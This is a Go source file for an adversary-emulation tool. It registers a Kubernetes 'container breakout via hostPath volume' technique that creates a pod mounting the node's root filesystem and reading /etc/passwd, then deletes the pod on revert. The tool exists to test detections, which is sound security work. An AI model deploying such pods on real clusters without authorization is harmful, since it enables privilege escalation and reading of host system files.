package kubernetes

import (
	"context"
	v1 "k8s.io/api/core/v1"
	"log"

	_ "embed"

	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.privilege-escalation.hostpath-volume",
		FriendlyName:       "Container breakout via hostPath volume mount",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.PrivilegeEscalation},
		Description: `
Creates a Pod with the entire node root filesystem as a hostPath volume mount

Warm-up: 

- Creates the Stratus Red Team namespace

Detonation: 

- Create a privileged busybox pod with the node root filesystem mounted at "/host" 
	that reads "/etc/passwd" from the host filesystem
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
		Revert:                     revert,
	})
}

func detonate(params map[string]string) error {
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podSpec := nodeRootPodSpec(namespace)

	log.Println("Creating malicious pod: " + podSpec.ObjectMeta.Name)
	_, err := client.CoreV1().Pods(namespace).Create(
		context.Background(),
		nodeRootPodSpec(namespace),
		metav1.CreateOptions{},
	)
	log.Println("Pod created")

	return err
}

func revert(params map[string]string) error {
	client := providers.K8s().GetClient()
	namespace := params["namespace"]
	podSpec := nodeRootPodSpec(namespace)

	log.Println("Removing malicious Pod: " + podSpec.ObjectMeta.Name)
	err := client.CoreV1().Pods(namespace).Delete(
		context.Background(),
		podSpec.ObjectMeta.Name,
		metav1.DeleteOptions{},
	)

	return err
}

func nodeRootPodSpec(namespace string) *v1.Pod {
	return &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name:      "k8s.privilege-escalation.hostpath-volume",
			Namespace: namespace,
		},
		Spec: v1.PodSpec{
			Containers: []v1.Container{
				{
					Name:  "busybox",
					Image: "busybox:stable",
					Command: []string{
						"cat",
					},
					Args: []string{
						"/host/etc/passwd",
					},

					VolumeMounts: []v1.VolumeMount{
						{
							Name:      "hostfs",
							MountPath: "/host",
						},
					},
				},
			},
			Volumes: []v1.Volume{
				{
					Name: "hostfs",
					VolumeSource: v1.VolumeSource{
						HostPath: &v1.HostPathVolumeSource{
							Path: "/",
						},
					},
				},
			},
		},
	}
}
